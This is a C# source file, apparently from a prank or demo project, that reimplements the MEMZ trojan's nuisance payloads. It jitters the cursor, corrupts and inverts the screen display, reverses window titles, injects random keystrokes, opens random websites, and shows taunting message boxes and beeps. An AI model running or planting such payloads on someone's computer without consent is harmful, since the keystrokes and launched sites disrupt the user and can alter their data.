using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;
using ImageProcessor;
using ScreenLib;

namespace GlitchPayloads
{
    [PayloadClass]
    public static class Memz
    {
        private static Rectangle _bounds = ScreenMan.GetBounds();
        private static readonly Icon ErrorIcon = SystemIcons.Error;
        private static Size _halfErrorIcon = new Size(ErrorIcon.Width / 2, ErrorIcon.Height / 2);
        private static readonly Icon WarningIcon = SystemIcons.Warning;
        private static readonly int XMaxWarning = _bounds.Width - WarningIcon.Width;
        private static readonly int YMaxWarning = _bounds.Height - WarningIcon.Height;

        private static readonly string[] Sites =
            GlitchPayloads.Sites.SiteString.Split(new[] {"\n", "\r"}, StringSplitOptions.RemoveEmptyEntries);

        private static string _siteChoice = "";
        private static readonly Size Size34 = new Size((_bounds.Width / 4) * 3, (_bounds.Height / 4) * 3);
        private static readonly Point Point34 = new Point(_bounds.Width / 8, _bounds.Height / 8);

        [Payload(true, 50, 200)]
        public static void PayloadCursor()
        {
            Point tmp = Cursor.Position;
            tmp.X += Common.Rnd.Next(-2, 3);
            tmp.Y += Common.Rnd.Next(-2, 3);
            Cursor.Position = tmp;
        }

        [Payload(true, 150, 4000)]
        public static void PayloadInvert()
        {
            using MemoryStream ms = new MemoryStream();
            using ImageFactory imageFactory = new ImageFactory();
            imageFactory.Load(ScreenMan.CaptureScreen())
                .InvertColor()
                .Save(ms);
            ms.Position = 0;
            using DCDrawer drawerBuffered = ScreenMan.GetDrawer();
            drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms), Point.Empty);
        }

        [Payload(true, 280, 4000)]
        public static void PayloadTunnel()
        {
            using MemoryStream ms = new MemoryStream();
            using ImageFactory imageFactory = new ImageFactory();
            Image tmp = ScreenMan.CaptureScreen();
            imageFactory.Load(tmp)
                .Resize(Size34)
                .Save(ms);
            ms.Position = 0;
            using DCDrawer dcdrawer = ScreenMan.GetDrawer();
            dcdrawer.Graphics.DrawImageUnscaled(tmp, Point.Empty);
            dcdrawer.Graphics.DrawImageUnscaled(Image.FromStream(ms), Point34);
        }

        [Payload(false, 220, 4000)]
        public static void PayloadReverseText()
        {
            foreach (Wnd32 wnd in Wnd32.getAll())
            {
                string? tmp = wnd.title;
                if (!string.IsNullOrWhiteSpace(tmp))
                    wnd.title = string.Join("", tmp.ToCharArray().Reverse());
            }
        }

        [Payload(false, 70, 4000)]
        public static void PayloadKeyboard()
        {
            SendKeys.SendWait($"{(char) Common.Rnd.Next(48, 123)}");
        }

        [Payload(true, 120, 4000)]
        public static void PayloadSound()
        {
            SystemSound[] sounds = typeof(SystemSounds).GetProperties()
                .Select(s => (SystemSound) s.GetValue(null, null)).ToArray();

            sounds[Common.Rnd.Next(sounds.Length)].Play();
        }

        [Payload(false, 30, 4000)]
        public static void PayloadExecute()
        {
            try
            {
                _siteChoice = Sites[Common.Rnd.Next(Sites.Length)];
                Process.Start(_siteChoice);
            }
            catch (Exception e)
            {
                throw new Exception($"Choice was: {_siteChoice}", e);
            }
        }

        [Payload(true, 170, 12000)]
        public static void PayloadMessageBox()
        {
            new Thread(() => MessageBox.Show("Still using this computer?", "lol", MessageBoxButtons.OK,
                MessageBoxIcon.Warning)).Start();
        }

        [Payload(true, 180, 800)]
        public static void PayloadDrawWarnings()
        {
            using DCDrawer drawerBuffered = ScreenMan.GetDrawer(false);
            drawerBuffered.Graphics.DrawIcon(WarningIcon, Common.Rnd.Next(XMaxWarning + 1),
                Common.Rnd.Next(YMaxWarning + 1));
        }

        [Payload(true, 180, 400)]
        public static void PayloadDrawErrors()
        {
            Point tmp = Cursor.Position;
            using DCDrawer drawerBuffered = ScreenMan.GetDrawer(false);
            drawerBuffered.Graphics.DrawIcon(ErrorIcon, tmp.X - _halfErrorIcon.Width, tmp.Y - _halfErrorIcon.Height);
        }

        [Payload(true, 305, 800)]
        public static void PayloadCrazyBus()
        {
            Beep.BeepBeep(1000, Common.Rnd.Next(1000, 6000), (int) (800 * Common.DelayMultiplier));
        }

        [Payload(true, 295, 4000)]
        public static void PayloadScreenGlitches()
        {
            Size objSize = new Size(Common.Rnd.Next(100, 500), Common.Rnd.Next(100, 500));
            int xMax = _bounds.Width - objSize.Width;
            int yMax = _bounds.Height - objSize.Height;
            using MemoryStream ms = new MemoryStream();
            using ImageFactory imageFactory = new ImageFactory();
            imageFactory.Load(ScreenMan.CaptureScreen())
                .Crop(new Rectangle(new Point(Common.Rnd.Next(xMax), Common.Rnd.Next(yMax)), objSize))
                .Save(ms);
            ms.Position = 0;
            using DCDrawer drawerBuffered = ScreenMan.GetDrawer(false);
            drawerBuffered.Graphics.DrawImageUnscaled(Image.FromStream(ms),
                new Point(Common.Rnd.Next(xMax), Common.Rnd.Next(yMax)));
        }
    }
}